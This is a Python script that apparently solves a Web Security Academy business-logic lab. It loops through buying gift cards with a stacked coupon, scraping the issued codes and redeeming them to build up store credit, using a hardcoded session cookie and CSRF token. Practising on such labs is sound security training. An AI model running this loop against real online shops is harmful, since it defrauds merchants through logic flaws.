import requests
from bs4 import BeautifulSoup
import re

laburl = 'https://0aae00c2046385d1861fdcee0073005e.web-security-academy.net/'

cookies = 'OVy3fJmnu2nKBEtkKq2VlwvbvrIymZxj'


while True:

    quantity = 10

    response = requests.post(
        laburl + 'cart', 
        cookies={'session': cookies}, 
        data={'productId': '2', 'redir': 'PRODUCT', 'quantity': {quantity}}
    )
    print('Step 1 response:', response.status_code)
    if response.status_code != 200:
        raise Exception('Failed at Step 1')

    # Step 2: Apply coupon
    response = requests.post(
        laburl + 'cart/coupon', 
        cookies={'session': cookies}, 
        data={'csrf': 'WtRMfQsFdijVmkDEwkqoRYfLYTBjoaMp', 'coupon': 'SIGNUP30'}
    )
    print('Step 2 response:', response.status_code)
    if response.status_code != 200:
        raise Exception('Failed at Step 2')

    # Step 3: Checkout
    response = requests.post(
        laburl + 'cart/checkout', 
        cookies={'session': cookies}, 
        data={'csrf': 'WtRMfQsFdijVmkDEwkqoRYfLYTBjoaMp'}, 
        allow_redirects=True
    )
    print('Step 3 response:', response.status_code)
    if response.status_code != 200:
        raise Exception('Failed at Step 3')


    soup = BeautifulSoup(response.text, 'html.parser')
    td_elements = soup.find_all('td')

    codes = []

    code_pattern = re.compile(r'^[A-Za-z0-9]{10}$')

    for td in td_elements:
        text = td.get_text(strip=True)
        if code_pattern.match(text):
            codes.append(text)

    #print(codes)

    for code in codes[:10]:
        requests.post(
            laburl + 'gift-card', 
            cookies={'session': cookies}, 
            data={'csrf': 'WtRMfQsFdijVmkDEwkqoRYfLYTBjoaMp', 'gift-card': code}
        )